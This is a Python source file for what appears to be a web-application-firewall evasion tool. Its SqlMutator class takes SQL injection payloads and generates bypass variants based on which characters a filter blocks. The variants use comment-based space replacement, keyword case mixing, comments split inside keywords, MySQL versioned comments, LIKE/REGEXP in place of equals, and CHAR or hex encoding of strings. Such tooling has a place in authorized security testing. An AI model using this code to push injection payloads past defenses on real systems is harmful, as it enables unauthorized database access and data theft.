import re
from typing import List
from .base import BaseMutator
from ..prober import BlockMap

class SqlMutator(BaseMutator):
    """
    Applies SQL-specific obfuscation and syntax mutations.
    """

    def mutate(self, payload: str, block_map: BlockMap) -> List[str]:
        candidates = []

        # 1. Space replacement
        space_replacements = []
        if block_map.is_blocked(" "):
            # Check alternatives
            if not block_map.is_blocked("/") and not block_map.is_blocked("*"):
                space_replacements.append("/**/")
            if not block_map.is_blocked("+"):
                space_replacements.append("+")
            if not block_map.is_blocked("\n"):
                space_replacements.append("\n")
            if not block_map.is_blocked("\t"):
                space_replacements.append("\t")
        
        for rep in space_replacements:
            candidates.append(payload.replace(" ", rep))

        # 2. Casing changes for common keywords
        keywords = ["union", "select", "insert", "update", "delete", "where", "from", "and", "or", "like"]
        cased_payload = payload
        for kw in keywords:
            alt_casing = kw.capitalize() # simple title case
            cased_payload = re.sub(kw, alt_casing, cased_payload, flags=re.IGNORECASE)
            
            # Full uppercase
            cased_payload_upper = re.sub(kw, kw.upper(), payload, flags=re.IGNORECASE)
            candidates.append(cased_payload_upper)
            
            # Mixed casing
            mixed = "".join(char.upper() if idx % 2 == 0 else char.lower() for idx, char in enumerate(kw))
            candidates.append(re.sub(kw, mixed, payload, flags=re.IGNORECASE))

        candidates.append(cased_payload)

        # 3. Comment Injection inside keywords (e.g. un/**/ion)
        comment_kw_payload = payload
        for kw in ["union", "select", "where", "from"]:
            if len(kw) > 2:
                mid = len(kw) // 2
                split_kw = f"{kw[:mid]}/**/{kw[mid:]}"
                comment_kw_payload = re.sub(kw, split_kw, comment_kw_payload, flags=re.IGNORECASE)
        if comment_kw_payload != payload:
            candidates.append(comment_kw_payload)

        # 4. Versioned comments (MySQL specific) - e.g. /*!50000union*/
        version_comment_payload = payload
        for kw in ["union", "select", "from", "where"]:
            version_comment_payload = re.sub(kw, f"/*!50000{kw}*/", version_comment_payload, flags=re.IGNORECASE)
        if version_comment_payload != payload:
            candidates.append(version_comment_payload)

        # 5. Operator replacement (e.g., replace = with LIKE or REGEXP)
        if "=" in payload:
            if not block_map.is_blocked("l") and not block_map.is_blocked("i") and not block_map.is_blocked("k") and not block_map.is_blocked("e"):
                candidates.append(payload.replace("=", " LIKE "))
            if not block_map.is_blocked("r") and not block_map.is_blocked("e") and not block_map.is_blocked("g"):
                candidates.append(payload.replace("=", " REGEXP "))

        # 6. String representation replacement if quotes are blocked
        # e.g., 'admin' -> CHAR(97, 100, 109, 105, 110)
        # We can scan for strings in single or double quotes
        string_pattern = r"'(.*?)'|\"(.*?)\""
        matches = re.findall(string_pattern, payload)
        if matches:
            char_payload = payload
            hex_str_payload = payload
            for m in matches:
                # Find the matched group content (could be group 0 or 1 depending on quote type)
                matched_str = m[0] if m[0] else m[1]
                if not matched_str:
                    continue
                
                # CHAR representation
                char_codes = ",".join(str(ord(c)) for c in matched_str)
                char_replacement = f"CHAR({char_codes})"
                char_payload = char_payload.replace(f"'{matched_str}'", char_replacement).replace(f'"{matched_str}"', char_replacement)
                
                # HEX representation (0x...)
                hex_val = "0x" + matched_str.encode("utf-8").hex()
                hex_str_payload = hex_str_payload.replace(f"'{matched_str}'", hex_val).replace(f'"{matched_str}"', hex_val)
                
            if char_payload != payload:
                candidates.append(char_payload)
            if hex_str_payload != payload:
                candidates.append(hex_str_payload)

        return list(set(candidates))
